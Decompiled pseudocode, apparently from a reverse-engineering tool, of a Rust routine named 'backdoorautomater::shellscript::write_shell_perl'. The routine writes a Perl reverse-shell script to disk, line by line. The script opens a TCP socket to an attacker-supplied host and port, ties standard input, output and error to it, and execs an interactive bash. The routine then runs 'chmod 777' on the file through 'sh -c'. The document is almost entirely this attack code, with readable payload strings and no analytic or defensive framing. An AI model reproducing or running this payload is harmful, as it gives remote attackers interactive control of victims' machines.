long _ZN17backdoorautomater11shellscript16write_shell_perl17h0df48fc72a197687E
               (long param_1,long param_2,long param_3)

{
  long lVar1;
  undefined8 uVar2;
  int local_1ec;
  undefined4 local_1e8;
  undefined4 uStack_1e4;
  undefined4 uStack_1e0;
  undefined4 uStack_1dc;
  undefined8 local_1d8;
  undefined4 local_1c8;
  undefined4 uStack_1c4;
  undefined4 uStack_1c0;
  undefined4 uStack_1bc;
  undefined8 local_1b8;
  undefined4 local_1a8;
  undefined4 uStack_1a4;
  undefined4 uStack_1a0;
  undefined4 uStack_19c;
  undefined8 local_198;
  undefined4 local_168;
  undefined4 uStack_164;
  undefined4 uStack_160;
  undefined4 uStack_15c;
  undefined8 local_158;
  undefined4 local_148;
  undefined4 uStack_144;
  undefined4 uStack_140;
  undefined4 uStack_13c;
  undefined8 local_138;
  undefined8 local_130;
  undefined8 uStack_128;
  undefined4 local_120;
  undefined4 uStack_11c;
  undefined4 uStack_118;
  undefined4 uStack_114;
  undefined local_60 [32];
  undefined8 local_40;
  undefined8 local_38;
  
                    /* try { // try from 0015f758 to 0015f767 has its CatchHandler @ 0015fc35 */
  _ZN3std2fs4File6create17he97042899d0016f9E(&local_130,param_3);
  lVar1 = uStack_128;
  if ((int)local_130 == 0) {
    local_1ec = local_130._4_4_;
                    /* try { // try from 0015f78a to 0015f7f2 has its CatchHandler @ 0015fc1d */
    lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_1ec,"use Socket;\n",0xc);
    if (lVar1 == 0) {
      local_120 = *(undefined4 *)(param_2 + 8);
      uStack_11c = *(undefined4 *)(param_2 + 0xc);
      uStack_118 = *(undefined4 *)(param_2 + 0x10);
      uStack_114 = *(undefined4 *)(param_2 + 0x14);
      local_130 = &DAT_00265aa3;
      uStack_128 = 4;
      _ZN5alloc3str17join_generic_copy17hc78a65dc4338aaa9E(&local_1a8,&local_130,2,1,0);
      local_1d8 = local_198;
      local_1e8 = local_1a8;
      uStack_1e4 = uStack_1a4;
      uStack_1e0 = uStack_1a0;
      uStack_1dc = uStack_19c;
                    /* try { // try from 0015f807 to 0015f882 has its CatchHandler @ 0015fc0e */
      _ZN5alloc3vec16Vec_LT_T_C_A_GT_17extend_from_slice17h3cce9f7974121c70E(&local_1e8,"\';\n",3);
      lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                        (&local_1ec,CONCAT44(uStack_1dc,uStack_1e0),local_1d8);
      if (lVar1 == 0) {
        local_120 = *(undefined4 *)(param_1 + 8);
        uStack_11c = *(undefined4 *)(param_1 + 0xc);
        uStack_118 = *(undefined4 *)(param_1 + 0x10);
        uStack_114 = *(undefined4 *)(param_1 + 0x14);
        local_130 = "$p=";
        uStack_128 = 3;
        _ZN5alloc3str17join_generic_copy17hc78a65dc4338aaa9E(&local_1a8,&local_130,2,1,0);
        local_1b8 = local_198;
        local_1c8 = local_1a8;
        uStack_1c4 = uStack_1a4;
        uStack_1c0 = uStack_1a0;
        uStack_1bc = uStack_19c;
                    /* try { // try from 0015f897 to 0015f99e has its CatchHandler @ 0015fbff */
        _ZN5alloc3vec16Vec_LT_T_C_A_GT_17extend_from_slice17h3cce9f7974121c70E(&local_1c8,";\n",2);
        lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                          (&local_1ec,CONCAT44(uStack_1bc,uStack_1c0),local_1b8);
        if (((((lVar1 == 0) &&
              (lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                                 (&local_1ec,
                                  "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\'tcp\'));\n",0x35),
              lVar1 == 0)) &&
             (lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                                (&local_1ec,"if(connect(S,sockaddr_in($p,inet_aton($i)))){\n",0x2e),
             lVar1 == 0)) &&
            ((lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                                (&local_1ec,"open(STDIN,\'>&S\');\n",0x13), lVar1 == 0 &&
             (lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                                (&local_1ec,"open(STDOUT,\'>&S\');\n",0x14), lVar1 == 0)))) &&
           ((lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                               (&local_1ec,"open(STDERR,\'>&S\');\n",0x14), lVar1 == 0 &&
            ((lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                                (&local_1ec,"exec(\'/usr/bin/bash -i\');\n",0x1a), lVar1 == 0 &&
             (lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_1ec,"};\n",3),
             lVar1 == 0)))))) {
          local_120 = *(undefined4 *)(param_3 + 8);
          uStack_11c = *(undefined4 *)(param_3 + 0xc);
          uStack_118 = *(undefined4 *)(param_3 + 0x10);
          uStack_114 = *(undefined4 *)(param_3 + 0x14);
          local_130 = "chmod 777 ";
          uStack_128 = 10;
                    /* try { // try from 0015fa17 to 0015fa35 has its CatchHandler @ 0015fbff */
          _ZN5alloc3str17join_generic_copy17hc78a65dc4338aaa9E(&local_1a8,&local_130,2,1,0);
          local_158 = local_198;
          local_168 = local_1a8;
          uStack_164 = uStack_1a4;
          uStack_160 = uStack_1a0;
          uStack_15c = uStack_19c;
                    /* try { // try from 0015fa50 to 0015fa68 has its CatchHandler @ 0015fba3 */
          _ZN3std7process7Command3new17hc59b10cf3f1b2adaE(&local_130,"sh",2);
                    /* try { // try from 0015fa6c to 0015fad8 has its CatchHandler @ 0015fbdb */
          uVar2 = _ZN3std7process7Command3arg17ha1bca970e684ecbeE(&local_130,"-c",2);
          local_198 = local_158;
          local_1a8 = local_168;
          uStack_1a4 = uStack_164;
          uStack_1a0 = uStack_160;
          uStack_19c = uStack_15c;
          uVar2 = _ZN3std7process7Command3arg17hc1c88ee68029addcE(uVar2,&local_1a8);
          (*(code *)PTR__ZN3std7process7Command6output17hf2f7777b705db8a9E_00368e98)
                    (&local_1a8,uVar2);
          _ZN4core6result19Result_LT_T_C_E_GT_6expect17h4dac3b1149b99667E
                    (local_60,&local_1a8,&PTR_s_src_shellscript_rs_0032a830);
                    /* try { // try from 0015fad9 to 0015fb00 has its CatchHandler @ 0015fbc9 */
          _ZN4core3ptr42drop_in_place_LT_std__process__Command_GT_17h60da061aa1df0d14E(&local_130);
          (*(code *)PTR__ZN5alloc6string6String15from_utf8_lossy17h7ed9087fa43d10adE_00368300)
                    (&local_1a8,local_40,local_38);
                    /* try { // try from 0015fb01 to 0015fb1a has its CatchHandler @ 0015fbba */
          uVar2 = _ZN71__LT_alloc__borrow__Cow_LT_B_GT__u20_as_u20_core__ops__deref__Deref_GT_5deref17ha2c16a4b1cc76445E
                            (&local_1a8);
          _ZN52__LT_T_u20_as_u20_alloc__slice__hack__ConvertVec_GT_6to_vec17h4aa1dd8ab670f689E
                    (&local_130,uVar2);
          local_138 = CONCAT44(uStack_11c,local_120);
          local_148 = (int)local_130;
          uStack_144 = local_130._4_4_;
          uStack_140 = (undefined4)uStack_128;
          uStack_13c = uStack_128._4_4_;
                    /* try { // try from 0015fb3b to 0015fb51 has its CatchHandler @ 0015fba8 */
          _ZN4core3ptr50drop_in_place_LT_alloc__borrow__Cow_LT_str_GT__GT_17hb5385058f177b775E
                    (&local_1a8);
          _ZN17backdoorautomater9sanitizer23sanitize_system_command17hc9c6071c8b9b108cE(&local_148);
                    /* try { // try from 0015fb52 to 0015fb5e has its CatchHandler @ 0015fbc9 */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_148);
                    /* try { // try from 0015fb5f to 0015fb6b has its CatchHandler @ 0015fba1 */
          _ZN4core3ptr41drop_in_place_LT_std__process__Output_GT_17h78d1e539beaf0e46E(local_60);
                    /* try { // try from 0015fb6c to 0015fb75 has its CatchHandler @ 0015fc0e */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_1c8);
                    /* try { // try from 0015fb76 to 0015fb7f has its CatchHandler @ 0015fc1d */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_1e8);
                    /* try { // try from 0015fb84 to 0015fb88 has its CatchHandler @ 0015fc35 */
          _ZN4core3ptr34drop_in_place_LT_std__fs__File_GT_17hb99078073e1bf56bE(local_1ec);
                    /* try { // try from 0015fb89 to 0015fb90 has its CatchHandler @ 0015fc30 */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_3);
                    /* try { // try from 0015fb91 to 0015fb98 has its CatchHandler @ 0015fc2b */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_2);
          lVar1 = 0;
          goto LAB_0015f9d4;
        }
                    /* try { // try from 0015f9a7 to 0015f9b0 has its CatchHandler @ 0015fc0e */
        _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_1c8);
      }
                    /* try { // try from 0015f9b1 to 0015f9ba has its CatchHandler @ 0015fc1d */
      _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_1e8);
    }
                    /* try { // try from 0015f9bf to 0015f9c3 has its CatchHandler @ 0015fc35 */
    _ZN4core3ptr34drop_in_place_LT_std__fs__File_GT_17hb99078073e1bf56bE(local_1ec);
  }
                    /* try { // try from 0015f9c4 to 0015f9cb has its CatchHandler @ 0015fc30 */
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_3);
                    /* try { // try from 0015f9cc to 0015f9d3 has its CatchHandler @ 0015fc2b */
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_2);
LAB_0015f9d4:
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_1);
  return lVar1;
}